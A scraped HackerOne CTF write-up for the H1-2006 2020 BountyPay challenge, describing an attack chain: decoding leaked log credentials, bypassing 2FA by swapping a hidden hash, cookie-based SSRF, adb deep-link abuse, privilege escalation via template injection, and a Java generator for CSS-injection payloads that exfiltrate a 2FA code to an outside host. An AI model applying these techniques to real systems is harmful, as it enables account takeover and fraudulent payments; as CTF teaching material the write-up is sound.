---
title: "[H1-2006 2020] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool"
author: bcobain23
url: https://hackerone.com/reports/895172
date_published: 2020-06-10
date_scraped: 2026-11-17
platform: hackerone
disclosed_report: https://hackerone.com/reports/895172
bounty: not stated
vuln_class: access-control
---

<!-- Raw scraped text below. Public, non-paywalled content only. -->

23

[#895172](https://hackerone.com/reports/895172)

Copy report idCopy report id

\[H1-2006 2020\] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool

- Share:

Report

Timeline

[![bcobain23](https://profile-photos.hackerone-user-content.com/variants/UjFcwnsggEsnHx3RA2m3XER5/f4770e29726b679d8210b3bcebb50139392345e8ead50e7d67de79a93076e327)](https://hackerone.com/bcobain23)

[bcobain23](https://hackerone.com/bcobain23)

submitted a report to [**h1-ctf**](https://hackerone.com/h1-ctf).

June 10, 2020, 5:14am UTC

MenuMenu

H1-2006 CTF Writeup

imageimage

**Image**•62.69 KiB•F859938: Twitter\_intro.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

## Summary:

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:

- Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
- Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
- Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
- Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
- CORS misconfiguration allows unauthorized API access.
- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

## Steps To Reproduce:

1- Information Disclosure

When performing a search for BountyPay on Google, a result appears on Github [https://github.com/bounty-pay-code/request-logger/blob/master/logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php), we access this and it shows us a Logger file that contains log information in the path /bp\_web\_trace.log. When we visit [https://app.bountypay.h1ctf.com/bp\_web\_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log) it downloads the .log file which contains base64 encoded data.

imageimage

**Image**•35.68 KiB•F861649: Google\_Search\_BountyPay.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•94.83 KiB•F861648: Github\_Log\_BountyPay.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We send this data to Burp Suite / Decoder and it provides us with the following information:

Base64 Encoded:
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

Base64 Decoded:

{"IP":"192.168.1.1","URI":"\\/","METHOD":"GET","PARAMS":{"GET":\[\],"POST":\[\]}}
{"IP":"192.168.1.1","URI":"\\/","METHOD":"POST","PARAMS":{"GET":\[\],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\\/","METHOD":"POST","PARAMS":{"GET":\[\],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge\_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":\[\]}}

imageimage

**Image**•58.07 KiB•F861647: Fase1\_Login\_User\_Passwd.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Well, now we have a username and password to access [https://app.bountypay.h1ctf.com](https://app.bountypay.h1ctf.com/), but upon entering it asks for a second authentication factor that we do not have.

2- Login 2FA Bypass

imageimage

**Image**•51.67 KiB•F861666: First\_2FA\_BrienOliver.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•106.99 KiB•F861669: First\_2FA\_Hash\_Predefined.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Now we have a double authentication factor, but we do not have the 10-character password that is sent to the mobile phone. This password contains characters like A-Z, a-z and 0-9. We try random characters but without results. When inspecting element, we can see that the following is found:

<input type="hidden" name="challenge" value="a829e6865ae4ef4ace5c24b091fa8a91">, where value corresponds to an MD5 hash corresponding to the 10 character password. We try to decode this hash and get no results.

Now if we consider that the password contains 10 characters that can be A-Z , a-z y 0-9, we create our hash MD5 with the amount of characters requested on the web [https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/). We create a string with 1111111111 (can be whatever)
and the result of our hash is e11170b8cbd2d74102651cb967fa28e5.

imageimage

**Image**•23.51 KiB•F861668: First\_2FA\_Bypass\_Hash.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We replace the hash in "value" mentioned above and we put ours, as we know what is the string correct we use it as our password for the 2FA managing to make the Bypass.

imageimage

**Image**•113.17 KiB•F861670: First\_2FA\_Hash\_Modified.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We entered and we found BountyPay Dashboard, We try to load the transactions corresponding to May 2020, but it gives us the message "No Transactions To Process". Well in this part I thought "now I have to make the payment, but wait, this is not easy hahaha". We review the transactions of the 12 months and it sends the same message, so we deduce that we do not have the permissions to carry out this operation with the account of brien oliver.

imageimage

**Image**•46.70 KiB•F861667: First\_2FA\_Bypass\_Done.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•34.39 KiB•F861671: No\_Transactions\_To\_Process.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We try to use the cookie to be able to change users, but it is not possible to carry out the operation. At this moment I did not know well what I could do to move forward, so I stopped and went to have a coffee to clear my head for a few moments, after several attempts I could not continue or find something that would help me, which is why I started to check other subdomains in search of something to help me continue, use Dirb, Dirsearch, etc.

After several hours look at the cookie again and note that it is again a base64 and when sending it to the Decoder in Burp Suite it shows the following information:
{"account\_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}.

imageimage

**Image**•36.67 KiB•F861672: Request\_Response\_API.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•34.56 KiB•F861673: Request\_Response\_API\_2.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Here I couldn't go any further and I was stuck again. I began to review what else I could see within the requests when trying to load the transactions by month and year, I notice that the answer appears:
{"url":"https:\\/\\/api.bountypay.h1ctf.com\\/api\\/accounts\\/F8gHiqSdpK\\/statements?month=05&year=2020","data":"{\\"description\\":\\"Transactions for 2020-05\\",\\"transactions\\":\[\]}"}

3- SSRF

In order to use the SSRF vulnerability we must take the API found in the previous step and use it in our base64 encoded cookie. The information that the cookie gives us currently is:
{"account\_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}

So what we need is to modify this base64, to use the API and to be able to access [https://software.bountypay.h1ctf.com](https://software.bountypay.h1ctf.com/), which if we enter directly gives us a 401 Unauthorized "You do not have permission to access this server from your IP Address".

First if we go directly to the API [https://api.bountypay.h1ctf.com](https://api.bountypay.h1ctf.com/) we found a redirect in "REST API", ok now we will use this redirect to run our SSRF and access the URL that gives us 401.
How do we do it? We take the cookie, we modify it, we must go two directories behind and this would look like this:
{"account\_id":"../../redirect?url= [https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}](https://software.bountypay.h1ctf.com/#%22,%22hash%22:%22de235bffd23df6995ad4e0930baac1a2%22%7D)

We replace "F8gHiqSdpK" for "../../redirect?url= [https://software.bountypay.h1ctf.com/#"](https://software.bountypay.h1ctf.com/#%22) and this allows us to internally access the URL that 401 Unauthorized gave us. Well now that we can enter we must list directories, of course the aforementioned must be encoded in base64 and put it in the cookie.

Because testing brute forcing directory one by one and then passing it to base64 to send it, manually is very slow, so we create a Python script to list directories and when we get a 200 response, we will use that directory to pass it to base64 and log into [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) to download the application.
**_It looks simple right, believe me it was not._**
Python Script:

imageimage

**Image**•66.37 KiB•F861692: Python\_Script.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•50.36 KiB•F861693: URL\_Found\_SSRF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

4- Harcoded Validation

Now we have our APK for which I use a mobile phone with Android for testing, I install the application and it asks for a user, we enter it but it does nothing more.
In this part we must decompile the downloaded apk file and for this I use apktools.
We execute "apktool d BountyPay.apk" and leaves us a folder where we agree to review our AndroidManifest.xml.
In this part what is interesting are the "intent", of which we find 3 parts, but ok and now that, how can I execute this ?. Well I found a practical guide at [http://www.xgouchet.fr/android/index.php?article42/launch-intents-using-adb](http://www.xgouchet.fr/android/index.php?article42/launch-intents-using-adb) and [https://stackoverflow.com/questions/22921637/android-intent-data-uri-query-parameter](https://stackoverflow.com/questions/22921637/android-intent-data-uri-query-parameter)
If we understand these guides we can start executing the instructions using adb as follows:

First of all we run the application and enter a username and then enter the following commands:

imageimage

**Image**•30.55 KiB•F861695: Phone\_1.jpeg

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

First command:
adb shell am start -a "android.intent.action.VIEW" -d "one://part?start=PartTwoActivity"

imageimage

**Image**•62.12 KiB•F861696: Phone\_2.jpeg

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Second command:
adb shell am start -a "android.intent.action.VIEW" -d "two://part?two=light\\&switch=on"
Here it gives us a code 459a6f79ad9b13cbcb5f692d3cc7a94d and it asks for a "Header Value", it appears in the code inside the manifest and is X-Token, we enter it and we reach the third part.

imageimage

**Image**•90.09 KiB•F861698: Phone\_3.jpeg

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We enter the following below:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\&switch=b24=\\&header=X-Token"
and asks us "Submit leaked hash"

Until now we do not have this value, so we will have to capture the logs with the following command:
adb -d logcat bounty.pay:I

Now we enter again:
adb shell am start -a "android.intent.action.VIEW" -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\&switch=b24=\\&header=X-Token"

We stop it as soon as the word "token" appears on the screen and we enter this Hash on the phone to pass the apk 3 challenge.
Now we have our token from the X-Token apk: 8e9998ee3137ca9ade8f372739f062c1 and we must see what we can do with this token.

imageimage

**Image**•51.39 KiB•F861699: ADB\_Part3\_Hash.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•66.48 KiB•F861700: Phone\_4.jpeg

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

5- Sensitive information disclosure

We go back to Twitter and check some Hint in Hackerone, but we don't see something relevant, so we go to Twitter BountyPay and we only see that a new person Sandra Allison has entered. If we review Sandra appears indicating "First Day at BountyPayHQ" showing her credential where we can view her STF:8FJ3KFISL3

imageimage

**Image**•22.04 KiB•F861707: BountyPay\_Sandra\_1.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•103.15 KiB•F861706: BountyPay\_Sandra\_2\_STF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

What can we do with her STF:8FJ3KFISL3 ?

Previously, when using dirsearch to the API, it gave us the following:
/api/accounts/login
/api/accounts/signin
/api/accounts/logon
/api/staff

So we started testing the X-Token: 8e9998ee3137ca9ade8f372739f062c1 that we got from the apk by sending requests GET, and gives us the following information:
\[{"name":"Sam Jenkins","staff\_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff\_id":"STF:KE624RQ2T9"}\]

imageimage

**Image**•69.37 KiB•F861709: BountyPay\_Users\_3\_STF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Well, the X-Token works, but we still can't move forward. In this part I started to try the method POST and we put staff\_id=STF:8FJ3KFISL3 Sandra user and boom gives us an answer:
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc\*xsz7Yp5"}

imageimage

**Image**•74.70 KiB•F861710: BountyPay\_Create\_Sandra\_4\_STF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Now we have created account, user and password of Staff. We test the credentials and enter to [https://staff.bountypay.h1ctf.com](https://staff.bountypay.h1ctf.com/)

imageimage

**Image**•44.58 KiB•F861712: BountyPay\_Login\_Staff\_4\_STF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

imageimage

**Image**•41.28 KiB•F861711: BountyPay\_Logon\_Staff\_5\_STF.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

6- Privilege Escalation

Already within the account of Sandra as Staff we reviewed the page and we found "Home", "Support Tickets", "Profile" y "Logout".
We entered each of the options but we did not find anything useful to perform any other operation, this was one of the hardest parts of getting through, you will understand why.

We check the source code of the page, but we did not find anything useful.

We go to the developer tools in Firefox (es igual en Chrome) and we entered to review the debugger where we found 3 .js files
The one that specifically catches our attention is website.js which contains the following:

imageimage

**Image**•124.57 KiB•F861721: JavaScript\_File\_website\_1.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

$('.upgradeToAdmin').click(function () {
let t = $('input\[name="username"\]').val();
$.get('/admin/upgrade?username=' + t, function () {
alert('User Upgraded to Admin')
})
}),
$('.tab').click(function () {
return $('.tab').removeClass('active'),
$(this).addClass('active'),
$('div.content').addClass('hidden'),
$('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
!1
}),
$('.sendReport').click(function () {
$.get('/admin/report?url=' + url, function () {
alert('Report sent to admin team')
}),
$('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' = document.location.hash && $('.tab1').trigger('click'), '#tab2' = document.location.hash && $('.tab2').trigger('click'), '#tab3' = document.location.hash && $('.tab3').trigger('click'), '#tab4' = document.location.hash && $('.tab4').trigger('click'));

Well, what we see here, first we find that there is a function with which we could escalate privileges to Admin, but how?

Let's keep checking and see that this applies to the "click" function, but we still don't know how to use this.

Let's see again, we have a file and a function with which we can escalate privileges, so we dedicate ourselves to find out how to use this and make the administrator give us this privilege.

When we review the options that the page gives us at the bottom we can see that it says "Report This Page", we click on it and it gives us the option to report now and also the following information:
"Pages in the /admin directory will be ignored for security"

imageimage

**Image**•50.21 KiB•F861725: Report\_This\_Page\_3.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Now we know we can get to /admin but we can't go to a directory below because of page restrictions.

We perform the "Report This Page" operation again and intercept with Burp to check what data or useful information it is sending and we see that in the URL it sends:
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l

Again we see a base64 crash that contains /?Template=home

We know that we have to escalate privileges in order to overcome this part, but I still can't see how?

I go back once more to review website.js and try to figure out how to use this function to go from being Staff to Admin.

We try to URL [https://staff.bountypay.h1ctf.com/admin/upgrade?username=8FJ3KFISL3](https://staff.bountypay.h1ctf.com/admin/upgrade?username=8FJ3KFISL3) but it gives us back "Only admins can perform this"

imageimage

**Image**•30.74 KiB•F861726: Upgrade\_Admin\_1.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

OK, if we inspect element we see that the avatar is an "input" so we will try to use it to include the functions of the .js file so we will put avatar 3 = tab4 upgradeToAdmin

imageimage

**Image**•98.21 KiB•F861727: Upgrade\_Admin\_2\_functions\_tab4.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We send the request to Burp to see that this field is modified, this is the first step.

Now we must modify the URL and add an "Array" to use the function and escalate privileges using and Burp, we do this with the Support Tickets option, where we must practically call several URLs on the same page and we do it with the following URL:
[https://staff.bountypay.h1ctf.com/?template\[\]=login&username=sandra.allison&template\[\]=ticket&ticket\_id=3582#tab4](https://staff.bountypay.h1ctf.com/?template%5B%5D=login&username=sandra.allison&template%5B%5D=ticket&ticket_id=3582#tab4)

imageimage

**Image**•55.91 KiB•F861728: Upgrade\_Admin\_3\_functions\_tab4.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We intercept this in Burp Suite because the browser removes us #tab4

Select "Report This Page", the report is sent with our modifications, the page is pasted without loading, so we must return to "Home" URL [https://staff.bountypay.h1ctf.com](https://staff.bountypay.h1ctf.com/)

imageimage

**Image**•36.15 KiB•F861730: Report\_This\_Page\_2.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Boom we see the "Admin" tab, now we access it and we see the user of marten.mickos and his password h&H5wy2Lggj\*kKn4OD&Ype

imageimage

**Image**•41.54 KiB•F861731: Upgrade\_Admin\_4\_functions\_tab4.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We must re-enter the site, but now as admin with the account Marten Mickos in the URL [https://staff.bountypay.h1ctf.com](https://staff.bountypay.h1ctf.com/)

7- 2FA Payments Bypass through SSRF

Now in this last part we login to [https://staff.bountypay.h1ctf.com](https://staff.bountypay.h1ctf.com/) with user account marten.mickos and password h&H5wy2Lggj\*kKn4OD&Ype

imageimage

**Image**•53.63 KiB•F861735: Login\_Marten\_Mickos.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Well, at the first admission, you ask us to enter 2FA again as at the beginning.

It indicates that a 10-character password is sent to the mobile phone and characters between A-Z, a-z and 0-9

Try modifying as the first 2FA, inspecting element we create an MD5 with the following:
e11170b8cbd2d74102651cb967fa28e5 = 1111111111

imageimage

**Image**•112.91 KiB•F861737: Second\_2FA\_Marten\_Mickos.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

Now we are in the Marten Mickos account, we load the May 2020 transactions, well now it shows us the information and the payment button.

imageimage

**Image**•43.71 KiB•F861738: Transacciones.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We select to pay, but again another challenge asks us for another 2FA authentication to make the payment, this time modifying html no longer works.

imageimage

**Image**•45.22 KiB•F861740: 2FA\_Pay.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We intercept the request to see what information is being sent and we see the following:
app\_style= [https://www.bountypay.h1ctf.com/css/uni\_2fa\_style.css](https://www.bountypay.h1ctf.com/css/uni_2fa_style.css)

We visit this URL to see if it gives us some type of information to overcome this challenge and it only shows us the following:

/\* _Template for the UNI 2FA App_/

body {
background-color: #FFFFFF;
}

div.branding {
height:80px;
width:80px;
margin:20px auto 40px auto;
background-image:url(" [https://www.bountypay.h1ctf.com/images/bountypay.png")](https://www.bountypay.h1ctf.com/images/bountypay.png%22));
background-position:center center;
background-repeat: no-repeat;
background-size: cover;
}

So now with what we have, we see that in the request a .css file is sent and will look for which is why we will need to create a .css file so that it can be fetched and mounted on our ssl server.

Now we create the following buri.css file

import java.io.FileWriter;
import java.io.IOException;

public class CssExfiltrator{

String hostname = " [https://u61wqtubaeskyx8lah6eb0705rbhz6.example.com/"](https://u61wqtubaeskyx8lah6eb0705rbhz6.example.com/%22); // [https://example.com/](https://example.com/)
String cssFile = "bcobain23.css"; // uni\_2fa\_style.css

String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\_-";

public void writeFile(StringBuilder css){
try {
FileWriter fw = new FileWriter(cssFile);
fw.write(css.toString());
fw.close();
System.out.println("Successfully wrote css file");
} catch (IOException e) {
System.out.println("An error occurred.");
e.printStackTrace();
}
}

public void getInputNames(String input){
StringBuilder css = new StringBuilder();
for(char s:characters.toCharArray()){
css.append("input\[name^='").append(input).append(s).append("'\] {background: url('").append(hostname).append(s).append("');}").append("\\n");
}
System.out.println(css.toString());
writeFile(css);
}

public void getInputValues(){
StringBuilder css = new StringBuilder();
for(int i=1; i<=7; i++){
for(char s:characters.toCharArray()){
css.append("input\[name='code\_").append(i).append("'\] {background: url('").append(hostname).append(i).append("/").append(s).append("');}").append("\\n");
}
}
System.out.println(css.toString());
writeFile(css);
}

public static void main(String\[\] args){
CssExfiltrator cssExf = new CssExfiltrator();

/ _if(args.length > 0){_
_cssExf.getInputNames(args\[0\]);_
_}else{_
_cssExf.getInputNames("");_
_}_/
cssExf.getInputValues();
}
}

We mount it on our server, use burp collaborator and see the following:

imageimage

**Image**•61.59 KiB•F861736: Request\_Collaborator\_Exfiltration.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We begin to exfiltrate the 2FA code one by one, in the image we can see that it gives us a number that is the correct position next to the corresponding character

imageimage

**Image**•111.87 KiB•F861734: Collaborator\_Exfiltration.JPG

Open image in fullOpen image in full

[Download mediaDownload media]([REDACTED-SIGNED-URL])

Copy reference IDCopy reference ID

CollapseCollapse

![]([REDACTED-SIGNED-URL])

We obtain the code, place it in an orderly manner and make the payment to the Hackers.
Challenge Completed.

Actually this was hours of suffering and my first participation in CTF, I thank the people who spent time creating this challenge, since I learned many new things.

## Impact

Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:

- Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.
- Allowing the primary key to be changed to another’s users record, permitting viewing or editing someone else’s account.
- Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.
- Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation.
- CORS misconfiguration allows unauthorized API access.
- Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.

attachmentsattachments

**39 attachments**

CollapseCollapse

- F859938: [Twitter\_intro.JPG]([REDACTED-SIGNED-URL] "Twitter_intro.JPG")

- F861647: [Fase1\_Login\_User\_Passwd.JPG]([REDACTED-SIGNED-URL] "Fase1_Login_User_Passwd.JPG")

- F861648: [Github\_Log\_BountyPay.JPG]([REDACTED-SIGNED-URL] "Github_Log_BountyPay.JPG")

- F861649: [Google\_Search\_BountyPay.JPG]([REDACTED-SIGNED-URL] "Google_Search_BountyPay.JPG")

- F861666: [First\_2FA\_BrienOliver.JPG]([REDACTED-SIGNED-URL] "First_2FA_BrienOliver.JPG")

- F861667: [First\_2FA\_Bypass\_Done.JPG]([REDACTED-SIGNED-URL] "First_2FA_Bypass_Done.JPG")

- F861668: [First\_2FA\_Bypass\_Hash.JPG]([REDACTED-SIGNED-URL] "First_2FA_Bypass_Hash.JPG")

- F861669: [First\_2FA\_Hash\_Predefined.JPG]([REDACTED-SIGNED-URL] "First_2FA_Hash_Predefined.JPG")

- F861670: [First\_2FA\_Hash\_Modified.JPG]([REDACTED-SIGNED-URL] "First_2FA_Hash_Modified.JPG")

- F861671: [No\_Transactions\_To\_Process.JPG]([REDACTED-SIGNED-URL] "No_Transactions_To_Process.JPG")

- F861672: [Request\_Response\_API.JPG]([REDACTED-SIGNED-URL] "Request_Response_API.JPG")

- F861673: [Request\_Response\_API\_2.JPG]([REDACTED-SIGNED-URL] "Request_Response_API_2.JPG")

- F861692: [Python\_Script.JPG]([REDACTED-SIGNED-URL] "Python_Script.JPG")

- F861693: [URL\_Found\_SSRF.JPG]([REDACTED-SIGNED-URL] "URL_Found_SSRF.JPG")

- F861695: [Phone\_1.jpeg]([REDACTED-SIGNED-URL] "Phone_1.jpeg")

- F861696: [Phone\_2.jpeg]([REDACTED-SIGNED-URL] "Phone_2.jpeg")

- F861698: [Phone\_3.jpeg]([REDACTED-SIGNED-URL] "Phone_3.jpeg")

- F861699: [ADB\_Part3\_Hash.JPG]([REDACTED-SIGNED-URL] "ADB_Part3_Hash.JPG")

- F861700: [Phone\_4.jpeg]([REDACTED-SIGNED-URL] "Phone_4.jpeg")

- F861706: [BountyPay\_Sandra\_2\_STF.JPG]([REDACTED-SIGNED-URL] "BountyPay_Sandra_2_STF.JPG")

- F861707: [BountyPay\_Sandra\_1.JPG]([REDACTED-SIGNED-URL] "BountyPay_Sandra_1.JPG")

- F861709: [BountyPay\_Users\_3\_STF.JPG]([REDACTED-SIGNED-URL] "BountyPay_Users_3_STF.JPG")

- F861710: [BountyPay\_Create\_Sandra\_4\_STF.JPG]([REDACTED-SIGNED-URL] "BountyPay_Create_Sandra_4_STF.JPG")

- F861711: [BountyPay\_Logon\_Staff\_5\_STF.JPG]([REDACTED-SIGNED-URL] "BountyPay_Logon_Staff_5_STF.JPG")

- F861712: [BountyPay\_Login\_Staff\_4\_STF.JPG]([REDACTED-SIGNED-URL] "BountyPay_Login_Staff_4_STF.JPG")

- F861721: [JavaScript\_File\_website\_1.JPG]([REDACTED-SIGNED-URL] "JavaScript_File_website_1.JPG")

- F861725: [Report\_This\_Page\_3.JPG]([REDACTED-SIGNED-URL] "Report_This_Page_3.JPG")

- F861726: [Upgrade\_Admin\_1.JPG]([REDACTED-SIGNED-URL] "Upgrade_Admin_1.JPG")

